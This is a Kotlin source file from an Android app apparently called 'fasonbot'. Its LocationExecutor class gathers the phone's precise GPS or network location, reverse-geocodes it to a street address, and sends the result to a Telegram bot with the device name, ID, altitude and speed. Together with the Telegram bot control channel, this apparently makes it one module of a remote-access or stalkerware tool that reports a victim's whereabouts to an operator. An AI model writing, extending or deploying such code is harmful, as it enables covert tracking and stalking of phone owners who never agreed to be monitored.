package com.fasonbot.app.action

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Address
import android.location.Geocoder
import android.location.Location
import android.os.Build
import android.os.Looper
import android.util.Log
import androidx.core.content.ContextCompat
import com.fasonbot.app.bot.TelegramApi
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.service.CoreService
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors


class LocationExecutor(context: Context) : BaseExecutor(context) {

    companion object {
        private const val TAG = "LocationExecutor"
        private const val TIMEOUT_MS = 30000L
    }

    private val fusedClient: FusedLocationProviderClient =
        LocationServices.getFusedLocationProviderClient(context)
    private val systemLocationMgr: android.location.LocationManager =
        context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    private var lastLocation: Location? = null
    private var activeCallback: LocationCallback? = null
    private val deviceId: String by lazy { DeviceManager.getDeviceId(context) }

    init {
        initialize()
    }

    private fun initialize() {
        fetchLastLocation()
    }

    private fun fetchLastLocation() {
        if (!hasPermission()) return

        try {
            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION) ||
                checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                fusedClient.lastLocation
                    .addOnSuccessListener { location ->
                        if (location != null) {
                            lastLocation = location
                        } else {
                            fallbackLocation()
                        }
                    }
                    .addOnFailureListener {
                        fallbackLocation()
                    }
            } else {
                fallbackLocation()
            }
        } catch (e: SecurityException) {
            fallbackLocation()
        }
    }

    private fun fallbackLocation() {
        try {
            if (systemLocationMgr.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)) {
                val location = systemLocationMgr.getLastKnownLocation(
                    android.location.LocationManager.NETWORK_PROVIDER
                )
                if (location != null) {
                    lastLocation = location
                    return
                }
            }
            if (systemLocationMgr.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)) {
                val location = systemLocationMgr.getLastKnownLocation(
                    android.location.LocationManager.GPS_PROVIDER
                )
                if (location != null) {
                    lastLocation = location
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Fallback location error: ${e.message}")
        }
    }

    private fun hasPermission(): Boolean {
        return checkPermission(Manifest.permission.ACCESS_FINE_LOCATION) ||
                checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
    }

    private fun checkPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) ==
                PackageManager.PERMISSION_GRANTED
    }

    fun canGetLocation(): Boolean {
        return systemLocationMgr.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER) ||
                systemLocationMgr.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)
    }

    
    // Get current location and send to Telegram
    fun getCurrentLocation() {
        if (!hasPermission()) {
            sendError("Location permission not granted")
            return
        }

        // Update service type for Android 14+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            CoreService.getInstance()?.updateServiceType(
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        }

        // Try cached location first (less than 1 minute old)
        lastLocation?.let {
            if (System.currentTimeMillis() - it.time < 60000) {
                sendLocation(it)
                return
            }
        }

        // Request fresh location
        requestSingleLocation()
    }

    private fun requestSingleLocation() {
        if (!hasPermission()) {
            sendError("No location permission")
            return
        }

        TelegramApi.sendMessage(
            context,
            "📍 <b>Getting Location</b>\n\n<i>Please wait...</i>",
            parseMode = "HTML"
        )

        try {
            val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
                .setMinUpdateIntervalMillis(2000)
                .setWaitForAccurateLocation(true)
                .setMaxUpdates(1)
                .build()

            activeCallback = object : LocationCallback() {
                override fun onLocationResult(result: LocationResult) {
                    result.lastLocation?.let { location ->
                        lastLocation = location
                        sendLocation(location)
                    } ?: run {
                        // Try fallback
                        fallbackLocation()
                        lastLocation?.let { sendLocation(it) }
                            ?: sendError("Could not determine location")
                    }
                    cleanup()
                }
            }

            fusedClient.requestLocationUpdates(request, activeCallback!!, Looper.getMainLooper())

            // Timeout handler
            android.os.Handler(Looper.getMainLooper()).postDelayed({
                handleTimeout()
            }, TIMEOUT_MS)

        } catch (e: SecurityException) {
            sendError("Location access denied: ${e.message}")
            cleanup()
        } catch (e: Exception) {
            // Fallback to balanced accuracy
            try {
                val request = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
                    .setMinUpdateIntervalMillis(5000)
                    .setMaxUpdates(1)
                    .build()

                activeCallback = object : LocationCallback() {
                    override fun onLocationResult(result: LocationResult) {
                        result.lastLocation?.let { location ->
                            lastLocation = location
                            sendLocation(location)
                        } ?: sendError("Could not determine location")
                        cleanup()
                    }
                }

                fusedClient.requestLocationUpdates(request, activeCallback!!, Looper.getMainLooper())
            } catch (e2: Exception) {
                sendError("Location error: ${e2.message}")
                cleanup()
            }
        }
    }

    private fun handleTimeout() {
        try {
            activeCallback?.let { fusedClient.removeLocationUpdates(it) }
            if (lastLocation == null) {
                fallbackLocation()
                lastLocation?.let { sendLocation(it) }
                    ?: sendError("Location timeout - try again in open area")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Timeout handler error: ${e.message}")
        }
        cleanup()
    }

    private fun cleanup() {
        activeCallback = null

        // Release service type for Android 14+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            CoreService.getInstance()?.releaseServiceType(
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        }
    }

    private fun sendLocation(location: Location) {
        val latitude = location.latitude
        val longitude = location.longitude
        val accuracy = location.accuracy
        val altitude = if (location.hasAltitude()) location.altitude else null
        val speed = if (location.hasSpeed()) location.speed else null
        val provider = location.provider?.uppercase() ?: "Unknown"
        val timestamp = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
            .format(Date(location.time))

        // Get address
        var addressText = ""
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                val geocoder = Geocoder(context, Locale.getDefault())
                val addresses = geocoder.getFromLocation(latitude, longitude, 1)
                if (!addresses.isNullOrEmpty()) {
                    addressText = formatAddress(addresses[0])
                }
            } else {
                @Suppress("DEPRECATION")
                val geocoder = Geocoder(context, Locale.getDefault())
                @Suppress("DEPRECATION")
                val addresses = geocoder.getFromLocation(latitude, longitude, 1)
                if (!addresses.isNullOrEmpty()) {
                    addressText = formatAddress(addresses[0])
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Geocoding error: ${e.message}")
        }

        val caption = buildString {
            append("📍 <b>Location Found</b>\n")
            append("━━━━━━━━━━━━━━━━━━\n\n")
            append("📱 <b>${BotConfig.getDeviceName()}</b>\n")
            append("🆔 $deviceId\n\n")
            append("📡 <b>Provider:</b> $provider\n")
            append("🎯 <b>Accuracy:</b> ${String.format("%.1f", accuracy)}m\n")
            altitude?.let {
                append("🏔️ <b>Altitude:</b> ${String.format("%.1f", it)}m\n")
            }
            speed?.let {
                val speedKmh = it * 3.6
                append("🚗 <b>Speed:</b> ${String.format("%.1f", speedKmh)} km/h\n")
            }
            append("📅 <b>Time:</b> $timestamp\n\n")
            if (addressText.isNotEmpty()) {
                append("📍 <b>Address:</b>\n$addressText")
            }
        }

        TelegramApi.sendLocation(context, latitude, longitude, caption)
    }

    private fun formatAddress(address: Address): String {
        val parts = mutableListOf<String>()
        address.getAddressLine(0)?.let { parts.add(it) }

        return parts.takeIf { it.isNotEmpty() }?.joinToString("\n")
            ?: listOfNotNull(
                address.locality,
                address.adminArea,
                address.countryName
            ).joinToString(", ")
    }

    private fun sendError(error: String) {
        Log.e(TAG, "Location error: $error")
        TelegramApi.sendMessage(
            context,
            "❌ <b>Location Error</b>\n\n$error",
            parseMode = "HTML"
        )
    }

    fun shutdown() {
        try {
            activeCallback?.let { fusedClient.removeLocationUpdates(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Shutdown error: ${e.message}")
        }
        executor.shutdown()
    }
}
